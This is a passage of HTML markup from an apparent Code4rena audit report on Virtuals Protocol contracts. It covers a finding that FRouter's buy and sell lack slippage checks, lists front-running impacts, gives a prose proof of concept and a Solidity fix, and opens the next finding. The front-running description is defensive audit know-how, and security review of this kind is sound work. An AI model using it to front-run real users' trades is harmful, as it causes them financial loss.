href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-210\"\u003eThanatOS\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-256\"\u003eTheCarrot\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-235\"\u003eVemus\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-503\"\u003eYouCrossTheLineAlfie\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-532\"\u003ezubyoz\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FRouter.sol#L95-L163\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FRouter.sol#L95-L163\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-2\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-2\" aria-label=\"finding description 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003esell\u003c/code\u003e and \u003ccode\u003ebuy\u003c/code\u003e functions in the \u003ccode\u003eFRouter\u003c/code\u003e contract lack a slippage check to ensure that the \u003ccode\u003eamountOut\u003c/code\u003e (the amount of tokens received after the trade) is not less than a certain percentage of the expected \u003ccode\u003eamountOut\u003c/code\u003e. Slippage occurs when the price of a token changes between the time a transaction is submitted and when it is executed, often due to low liquidity or high volatility.\u003c/p\u003e\n\u003ch3 id=\"impact-3\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eUser Losses\u003c/strong\u003e: Without a slippage check, users may receive significantly fewer tokens than expected, especially in volatile markets or low-liquidity pools.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFront-Running Attacks\u003c/strong\u003e: Malicious actors can exploit the lack of a slippage check by front-running transactions, manipulating the reserves to cause unfavorable price changes for the user.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eReduced Trust\u003c/strong\u003e: Users may lose confidence in the platform if they experience unexpected losses due to slippage, harming the platform’s reputation.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eEconomic Exploits\u003c/strong\u003e: Arbitrageurs or bots could exploit the lack of slippage protection to profit at the expense of users, draining liquidity from the pool.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"proof-of-concept-5\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eDeploy the \u003ccode\u003eFRouter\u003c/code\u003e contract and initialize it with a factory and asset token.\u003c/li\u003e\n\u003cli\u003eSet up a pair with low liquidity between \u003ccode\u003eTokenA\u003c/code\u003e and the asset token.\u003c/li\u003e\n\u003cli\u003eCall the \u003ccode\u003esell\u003c/code\u003e or \u003ccode\u003ebuy\u003c/code\u003e function with a large \u003ccode\u003eamountIn\u003c/code\u003e during a period of high volatility or low liquidity.\u003c/li\u003e\n\u003cli\u003eObserve that the \u003ccode\u003eamountOut\u003c/code\u003e received is significantly lower than expected, with no mechanism to revert the transaction.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended Mitigation Steps\u003c/h3\u003e\n\u003cp\u003eTo address this issue, add a slippage check in both the \u003ccode\u003esell\u003c/code\u003e and \u003ccode\u003ebuy\u003c/code\u003e functions. The functions should accept a \u003ccode\u003eminAmountOut\u003c/code\u003e parameter, which specifies the minimum acceptable \u003ccode\u003eamountOut\u003c/code\u003e. If the actual \u003ccode\u003eamountOut\u003c/code\u003e is less than \u003ccode\u003eminAmountOut\u003c/code\u003e, the transaction should revert.\u003c/p\u003e\n\u003cp\u003eExample fix for the \u003ccode\u003esell\u003c/code\u003e function:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esell\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Add a parameter for slippage protection\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEXECUTOR_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Zero addresses are not allowed.\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Zero addresses are not allowed.\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIFPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIFPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAmountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Ensure the amountOut is greater than or equal to minAmountOut\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Slippage exceeded\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esellTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etaxVault\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBondingTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapForAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSimilarly, apply the same logic to the \u003ccode\u003ebuy\u003c/code\u003e function by adding a \u003ccode\u003eminAmountOut\u003c/code\u003e parameter and checking it against the calculated \u003ccode\u003eamountOut\u003c/code\u003e. This will protect users from unexpected losses due to slippage and improve the overall trading experience.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-03-slippage-protection-in-agenttaxdcasell-and-bondingtaxswapforasset-is-calculated-at-execution-time-effectively-retrieving-the-very-same-price-that-the-trade-will-be-executing-at-ultimately-providing-no-protection\" style=\"position:relative;\"\u003e\u003ca href=\"#m-03-slippage-protection-in-agenttaxdcasell-and-bondingtaxswapforasset-is-calculated-at-execution-time-effectively-retrieving-the-very-same-price-that-the-trade-will-be-executing-at-ultimately-providing-no-protection\" aria-label=\"m 03 slippage protection in agenttaxdcasell and bondingtaxswapforasset is calculated at execution time effectively retrieving the very same price that the trade will be executing at ultimately providing no protection permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-7\"\u003e[M-03] Slippage protection in \u003ccode\u003eAgentTax::dcaSell\u003c/code\u003e and \u003ccode\u003eBondingTax::swapForAsset\u003c/code\u003e is calculated at execution time, effectively retrieving the very same price that the trade will be executing at, ultimately providing no protection\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-381\"\u003eJeremias\u003c/a\u003e, also found by \u003ca 